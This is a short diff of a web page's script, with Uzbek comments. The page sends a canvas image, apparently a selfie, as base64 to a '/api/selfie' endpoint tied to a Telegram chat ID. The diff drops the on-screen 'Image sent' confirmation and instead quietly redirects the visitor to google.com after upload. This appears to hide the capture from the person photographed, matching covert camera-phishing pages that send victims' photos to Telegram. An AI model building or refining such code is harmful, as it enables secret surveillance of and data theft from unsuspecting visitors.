@@ -46,16 +46,17 @@
           const base64 = c.toDataURL("image/png").split(",")[1];
 
           // Telegram API orqali yuborish
-          const resp = await fetch("/api/selfie", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, photo: base64 }),
-          });
+const resp = await fetch("/api/selfie", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ chat_id: chatId, photo: base64 }),
+});
+const data = await resp.json();
+if (!data.ok) throw new Error("Rasm yuborilmadi");
 
-          const data = await resp.json();
-          if (!data.ok) throw new Error("Rasm yuborilmadi");
+// Yo'naltirish
+window.location.href = "https://google.com";
 
-          alert("Rasm yuborildi ✅");
         } catch (err) {
           console.error(err);
           alert("Xatolik yuz berdi ❌");
@@ -66,3 +67,4 @@
     </script>
   </body>
 </html>
+
